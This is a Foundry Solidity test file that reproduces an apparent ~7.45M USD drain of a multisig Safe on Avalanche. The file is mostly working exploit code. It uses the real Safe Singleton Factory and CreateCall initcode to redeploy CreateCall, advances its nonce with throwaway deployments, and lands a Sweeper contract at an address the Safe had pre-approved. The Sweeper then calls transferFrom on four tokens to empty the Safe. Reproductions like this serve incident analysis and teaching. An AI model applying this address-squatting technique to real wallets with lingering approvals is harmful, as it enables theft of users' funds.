// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~7.45M USD (3,078,123 USDC + 351,374 WAVAX + 183.74 WETH.e + 10.77 BTC.b)
// Attacker (original EOA) : https://snowtrace.io/address/0x4c48b79b97516719444056d2bf0dc9564138fa0a
// MEV bot (landed the drain) : https://snowtrace.io/address/0x36b112875f921e51f5ea8ff39b374960694d21b3
// Victim Safe (2-of-7) : https://snowtrace.io/address/0x631fca4a73aee699638634479132452ef354b9b8
// Pre-approved squat address : https://snowtrace.io/address/0x3725bd4d175283108156c3f15f86e1c51266155d
// Approval-setting Tx (2026-03-07) : https://snowtrace.io/tx/0x6952f80bbbcad4368b020bcda600965cf0a520a8694db431b6b1521842d3829e
// Original attack Tx (reverted, front-run) : https://snowtrace.io/tx/0xf1f87d370290afe269ae8eb30fe8e5e4694ad153914a2de6d980641f4a331289
// MEV bot drain Tx (successful) : https://snowtrace.io/tx/0xf88a7960a07832e1bf5be64edbd12a9e615b4f63959a4b87a147f0c63c007ed5
//
// @Summary
// The Safe held standing unlimited ERC20 approvals (USDC, WAVAX, WETH.e, BTC.b), set 2026-03-07 and
// never revoked, to a counterfactual address that was empty on Avalanche. That address is the 13th
// CREATE output of a Safe CreateCall instance which itself is a deterministic CREATE2 output of the
// Safe Singleton Factory. An ERC20 approval is granted to an address, not to a specific caller, so
// whoever first occupies that address and calls transferFrom spends the approvals. Both the
// CreateCall CREATE2 deployment (salt 0, fixed initcode) and the 13-deep CREATE chain depend only
// on (deployer, nonce) / (deployer, salt, initcodehash) math, reproducible by any fresh EOA with no
// key, signature or role belonging to the Safe. The reconstruction below occupies the address the
// same way the attacker did and sweeps the four approved balances out of the Safe.

// Safe CreateCall v1.3.0: performCreate(value, deployment) does a plain CREATE of `deployment`.
interface ICreateCall {
    function performCreate(uint256 value, bytes memory deploymentData) external returns (address newContract);
}

// Deployed as the 13th CREATE from the CreateCall instance, so it lands at exactly the pre-approved
// address. address(this) is then the approvals' spender, so transferFrom pulls each balance out of
// the Safe without any Safe signature.
contract Sweeper {
    address private constant USDC = 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E;
    address private constant WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address private constant WETHe = 0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB;
    address private constant BTCb = 0x152b9d0FdC40C096757F570A51E494bd4b943E50;

    address private immutable safe;
    address private immutable recipient;

    constructor(address _safe, address _recipient) {
        safe = _safe;
        recipient = _recipient;
    }

    function sweep() external {
        _pull(USDC);
        _pull(WAVAX);
        _pull(WETHe);
        _pull(BTCb);
    }

    function _pull(address token) private {
        uint256 bal = IERC20(token).balanceOf(safe);
        require(IERC20(token).transferFrom(safe, recipient, bal), "transferFrom failed");
    }
}

contract SafeApprovalSquatExploit is Test {
    address internal constant SAFE = 0x631FCa4a73AEe699638634479132452ef354b9B8;
    address internal constant LANDING = 0x3725bD4D175283108156c3F15f86e1c51266155d;
    // Safe Singleton Factory (deterministic CREATE2 deployer, present on ~every chain).
    address internal constant SAFE_SINGLETON_FACTORY = 0x914d7Fec6aaC8cd542e72Bca78B30650d45643d7;
    // CreateCall instance: CREATE2(factory, salt=0, CREATECALL_INITCODE).
    address internal constant CREATE_CALL = 0xB22D635D552eC95142E2Abe3FfB859eA7d7C0316;

    IERC20 internal constant USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IERC20 internal constant WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
    IERC20 internal constant WETHe = IERC20(0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB);
    IERC20 internal constant BTCb = IERC20(0x152b9d0FdC40C096757F570A51E494bd4b943E50);

    uint256 internal constant ATTACK_BLOCK = 98_603_855;

    // Measured balances of the Safe at ATTACK_BLOCK - 1, which the sweep takes in full.
    uint256 internal constant DRAINED_USDC = 3_078_123_681_646; // 6 decimals
    uint256 internal constant DRAINED_WAVAX = 351_374_076_087_103_761_073_449; // 18 decimals
    uint256 internal constant DRAINED_WETHe = 183_747_433_456_727_608_183; // 18 decimals
    uint256 internal constant DRAINED_BTCb = 1_077_385_586; // 8 decimals

    // Exact CreateCall v1.3.0 creation code the attacker handed the Safe Singleton Factory. Embedded
    // so the CREATE2 result reproduces the same CreateCall address, and therefore the same 13th-CREATE
    // landing address. This is on-chain attacker calldata, not an etch.
    bytes internal constant CREATECALL_INITCODE =
        hex"608060405234801561001057600080fd5b5061044b806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80634847be6f1461003b5780634c8c9ea114610134575b600080fd5b6101086004803603606081101561005157600080fd5b81019080803590602001909291908035906020019064010000000081111561007857600080fd5b82018360208201111561008a57600080fd5b803590602001918460018302840111640100000000831117156100ac57600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f82011690508083019250505050505050919291929080359060200190929190505050610223565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101f76004803603604081101561014a57600080fd5b81019080803590602001909291908035906020019064010000000081111561017157600080fd5b82018360208201111561018357600080fd5b803590602001918460018302840111640100000000831117156101a557600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f82011690508083019250505050505050919291929050505061031d565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60008183518460200186f59050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614156102d3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260198152602001807f436f756c64206e6f74206465706c6f7920636f6e74726163740000000000000081525060200191505060405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff167f4db17dd5e4732fb6da34a148104a592783ca119a1e7bb8829eba6cbadef0b51160405160405180910390a29392505050565b600081516020830184f09050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614156103cc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260198152602001807f436f756c64206e6f74206465706c6f7920636f6e74726163740000000000000081525060200191505060405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff167f4db17dd5e4732fb6da34a148104a592783ca119a1e7bb8829eba6cbadef0b51160405160405180910390a29291505056fea2646970667358221220153dfbb31f5824b1a17183b88443b5d0771b935e8acd92186d58555a02e4b41f64736f6c63430007060033";

    address internal attacker;

    function setUp() public {
        vm.createSelectFork("avalanche", ATTACK_BLOCK - 1);
        attacker = makeAddr("attacker");
        vm.label(SAFE, "VictimSafe");
        vm.label(LANDING, "SquatAddress");
        vm.label(SAFE_SINGLETON_FACTORY, "SafeSingletonFactory");
        vm.label(CREATE_CALL, "CreateCall");
    }

    function testExploit() public {
        // Preconditions: the four approvals are live and unlimited, and the squat address is empty.
        assertEq(USDC.allowance(SAFE, LANDING), type(uint256).max, "USDC approval");
        assertEq(WAVAX.allowance(SAFE, LANDING), type(uint256).max, "WAVAX approval");
        assertEq(WETHe.allowance(SAFE, LANDING), type(uint256).max, "WETH.e approval");
        assertEq(BTCb.allowance(SAFE, LANDING), type(uint256).max, "BTC.b approval");
        assertEq(LANDING.code.length, 0, "squat address must start empty");

        // Everything below is a fresh EOA with no relationship to the Safe.
        vm.startPrank(attacker, attacker);

        // 1. Deploy the CreateCall instance deterministically via the Safe Singleton Factory.
        //    Factory calldata is salt(32 bytes) ++ initcode; salt is zero.
        (bool ok,) = SAFE_SINGLETON_FACTORY.call(abi.encodePacked(bytes32(0), CREATECALL_INITCODE));
        require(ok, "CreateCall deployment failed");
        require(CREATE_CALL.code.length > 0, "CreateCall not at expected address");

        // 2. Burn 12 throwaway deployments to advance CreateCall's nonce from 1 to 12.
        for (uint256 i; i < 12; ++i) {
            ICreateCall(CREATE_CALL).performCreate(0, hex"60006000f3"); // returns empty runtime
        }

        // 3. 13th CREATE lands the sweeper at exactly the pre-approved address.
        address sweeper =
            ICreateCall(CREATE_CALL).performCreate(0, abi.encodePacked(type(Sweeper).creationCode, abi.encode(SAFE, attacker)));
        assertEq(sweeper, LANDING, "sweeper did not land on the pre-approved address");

        // 4. Occupying the address, spend the standing approvals.
        Sweeper(sweeper).sweep();

        vm.stopPrank();

        // The attacker now holds the full basket and the Safe is emptied of all four tokens.
        assertEq(USDC.balanceOf(attacker), DRAINED_USDC, "USDC not drained");
        assertEq(WAVAX.balanceOf(attacker), DRAINED_WAVAX, "WAVAX not drained");
        assertEq(WETHe.balanceOf(attacker), DRAINED_WETHe, "WETH.e not drained");
        assertEq(BTCb.balanceOf(attacker), DRAINED_BTCb, "BTC.b not drained");
        assertEq(USDC.balanceOf(SAFE), 0, "USDC left in Safe");
        assertEq(WAVAX.balanceOf(SAFE), 0, "WAVAX left in Safe");
        assertEq(WETHe.balanceOf(SAFE), 0, "WETH.e left in Safe");
        assertEq(BTCb.balanceOf(SAFE), 0, "BTC.b left in Safe");

        console.log("USDC  drained:", DRAINED_USDC);
        console.log("WAVAX drained:", DRAINED_WAVAX);
        console.log("WETHe drained:", DRAINED_WETHe);
        console.log("BTCb  drained:", DRAINED_BTCb);
    }
}
